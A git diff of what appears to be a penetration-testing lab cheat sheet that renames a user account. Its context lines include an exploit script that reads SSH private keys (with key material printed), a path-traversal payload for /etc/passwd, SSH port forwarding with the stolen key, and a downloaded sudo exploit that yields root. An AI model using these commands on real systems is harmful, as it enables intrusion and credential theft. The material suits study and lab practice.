@@ -241,8 +241,8 @@ fireball         (id_ecdsa)
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
 ````
 ````
-/home/anita/.ssh/id_ecdsa.pub #public key
-/home/anita/.ssh/id_ecdsa #private key
+/home/userE/.ssh/id_ecdsa.pub #public key
+/home/userE/.ssh/id_ecdsa #private key
 ````
 ##### Errors
 this means no password! Use it to login as a user on the box
@@ -584,7 +584,7 @@ CVE-2018-18619 https://www.exploit-db.com/exploits/45853 Advanced Comment System
 ./50383.sh targets.txt /etc/ssh/*pub
 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK6SiUV5zqxqNJ9a/p9l+VpxxqiXnYri40OjXMExS/tP0EbTAEpojn4uXKOgR3oEaMmQVmI9QLPTehCFLNJ3iJo= root@web01
 
-./50383.sh targets.txt /home/anita/.ssh/id_ecdsa
+./50383.sh targets.txt /home/userE/.ssh/id_ecdsa
 192.168.138.245:8000
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAO+eRFhQ
@@ -1224,7 +1224,7 @@ http://10.11.1.35/section.php?page=/etc/passwd
 
 #### Enumeration
 ````
-anita@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
+userE@demon:/var/www/internal/backend/index.php #this file lives 5 directories deep.
 127.0.0.1:8000/backend/?view=../../../../../etc/passwd #So you have to add 5 ../ in order to read the files you want
 ````
 
@@ -2581,7 +2581,7 @@ tcp   LISTEN 0      511                *:443             *:*
 ````
 #### Local Port Foward
 ````
-ssh -i id_ecdsa anita@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
+ssh -i id_ecdsa userE@192.168.138.246 -p 2222 -L 8000:localhost:8000 -N
 ````
 #### Curl
 ````
@@ -2677,11 +2677,11 @@ uid=0(rootz) gid=0(root) groups=0(root)
 wget https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
 chmod +x exploit_nss.py
 
-anita@web01:~$ id
-uid=1004(anita) gid=1004(anita) groups=1004(anita),998(apache)
+userE@web01:~$ id
+uid=1004(userE) gid=1004(userE) groups=1004(userE),998(apache)
 
 
-anita@web01:~$ python3 exploit_nss.py 
+userE@web01:~$ python3 exploit_nss.py 
 # whoami
 root
 ````
